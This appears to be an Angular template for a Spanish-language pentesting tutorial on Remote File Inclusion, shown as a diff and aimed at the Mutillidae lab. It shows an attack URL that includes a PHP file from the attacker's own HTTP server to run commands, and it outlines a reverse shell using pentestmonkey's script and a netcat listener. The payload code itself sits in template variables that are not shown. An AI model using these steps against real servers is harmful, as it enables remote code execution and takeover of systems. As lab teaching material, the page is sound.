@@ -1,0 +1,109 @@
+<style>
+    p {
+        font-size: 18px;
+    }
+</style>
+<p-header>
+    <h1>Remote File inclusion</h1>
+</p-header>
+<div class="panel-wrapper">
+    <p-panel  [toggleable]="true">
+      <ng-template pTemplate="header">
+        <div class="header-container">
+          <h4>Que es Remote File Inclusion (RFI)</h4>
+        </div>
+      </ng-template>
+      <p>
+        RFI (remote File Inclusion) es una vulnerabilidad en aplicaciones web que permite a un atacante incluir y ejecutar archivos remotos,
+         usualmente scripts maliciosos, en la página web que se está cargando. 
+      </p>  
+      <p>
+        Esto ocurre cuando la aplicación no valida adecuadamente las entradas del usuario antes de incluir archivos externos. 
+        Los atacantes pueden aprovechar esta vulnerabilidad para ejecutar código malicioso en el servidor y tomar control del sistema
+      </p>    
+    </p-panel>
+</div><hr>
+<div class="panel-wrapper">
+    <p-panel  [toggleable]="true">
+        <ng-template pTemplate="header">
+            <div class="header-container">
+            <h4>Como funciona RFI</h4>
+            </div>
+        </ng-template>
+        <p>
+            Vamos a utilizar el siguiente portal para verlo
+        </p>  
+        <img src="assets/RFI/portal.PNG"><br><br>
+        <p>
+            Como vemos, en la URL se esta haciendo el include de home.php
+        </p>  
+        <p>
+            Ahora, a diferencia de LFI, vamos a incluir ficheros que esten en nuestro sistema, en lugar de estar en el sistema objetivo
+        </p> 
+        <p>
+            Que gano yo con esto?
+        </p> 
+        <p>
+            Si puedo incluir ficheros de mi equipo, puedo crear un fichero php que ejecute comandos, de esta forma podre lanzar comandos en el servidor.
+            Ademas, tambien podriamos mandarnos una revershell a nuestro equipo
+        </p> 
+
+        <p-panel  [toggleable]="true">
+            <ng-template pTemplate="header">
+                <div class="header-container">
+                <h4>Lanzar comandos</h4>
+                </div>
+            </ng-template>
+            <p>
+                Para lanzar comandos en la maquina victima a traves de RFI, necesitamos generar un fichero PHP que ejecute comandos, de esta forma, el comando se ejecutara en el servidor
+                objetivo.
+            </p>
+            <p>Para ello, vamos a generar un fichero llamado rfi.php con el siguiente contenido  </p>
+            <pre class="php"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.php')" class="copy-button"></button><br><hr><code class="language-javascript">{{ php }}</code></pre>
+            <p>En este caso, vamos a lanzar el comando <strong>whoami</strong> en el servidor</p>
+            <p>Una vez tengamos este fichero, tenemos que levantar un servidor http con python para poder compartir este fichero</p>
+            <p><strong>Nota: </strong> lanzaremos el servidor en el directorio donde tengamos el fichero efi.php</p>
+            <pre class="php"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.php')" class="copy-button"></button><br><hr><code class="language-javascript">{{ servidor }}</code></pre>
+            <br>
+            <img src="assets/RFI/servidor.PNG"><br><br>
+            <p>Ahora, solo tenemos que llamar a este fichero que hemos creado en la URL para que el fichero sea incluido</p>
+            <p>De esta forma, la url nos quedara algo similar a <strong>http://192.168.1.130/mutillidae/index.php?page=http://192.168.1.134:8000/rfi.php</strong></p>
+            <p>Como vemos, en lugar de llamar al fichero home.php, llamamos al fichero que tenemos en nuestro servidor http</p>
+            <p>Al acceder a esta URL, obtenemos el siguiente resultado</p>
+            <img src="assets/RFI/resultado.PNG"><br><br>
+            <p>A continuacion, vamos a ver otro ejemplo. En esta caso vamos a ver la direccion IP del servidor</p>
+            <img src="assets/RFI/ifconfig.PNG"><br><br>
+            <br>
+            <img src="assets/RFI/ifocnfigResult.PNG"><br><br>
+            <p>Para verlo un poco mejor, podemos acceder al codigo funente mediante <strong>CTRL + U</strong></p>
+            <img src="assets/RFI/ifconfigBonito.PNG"><br><br>
+        </p-panel>
+        <br>
+        <p-panel  [toggleable]="true">
+            <ng-template pTemplate="header">
+                <div class="header-container">
+                <h4>ReverShell</h4>
+                </div>
+            </ng-template>
+            <p>
+                En este caso, nuestro objetivo va a ser conseguir una revershell en el servidor
+            </p>
+            <p>Para ello, vamos a crear un nuevo fichero para establecer esta conexion</p>
+            <p><strong>Nota:</strong> como no puedo escribir el codigo porque el windows defender no me deja xD voy a poner el contenido en base64, lo unico que hara falta es hacer el decode para obtener el fichero</p>
+            <p>Adicionalmente, os dejo este <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> link</a> donde tambien se puede ver el fichero</p>
+            <pre class="php"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.php')" class="copy-button"></button><br><hr><code class="language-javascript">{{ rever }}</code></pre>
+            <p>Una vez tengamos este fichero vamos a necessitar un servidor http, igual que antes, para que se pueda llegar hasta él, y ponernos en escucha con netcat para recibir esta conexion </p>
+            <pre class="php"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.php')" class="copy-button"></button><br><hr><code class="language-javascript">{{ netcat }}</code></pre>
+            <p><strong>Nota:</strong> Puedes poner el puerto que quieras (que no se este usando), en este caso hemos puesto el 8081, 
+                lo unico que hay que tener en cuenta es que este puerto debe de ser el mismo que se indica en el fichero de la rever, ademas tambien tenemos que poner nusetra direccion IP</p>
+            <p>nos quedaria algo similar a esto en el fichero de la rever</p>
+            <img src="assets/RFI/reverConfig.PNG">
+            <p>Una vez tengamos esto listo, ponermos en marcha el servidor http y netcat, llamamos al fichero php con la rever que hemos generado, y listo</p>
+            <img src="assets/RFI/ready.PNG">
+            <p>Llamamos a la url y..</p>
+            <img src="assets/RFI/urlRever.PNG"><br><br>
+            <img src="assets/RFI/reverOk.PNG"><br><br>
+            <p>Como vemos en la parte de abajo, tenemos una shell reversa en el servidor objetivo</p>
+        </p-panel>
+    </p-panel>
+</div>
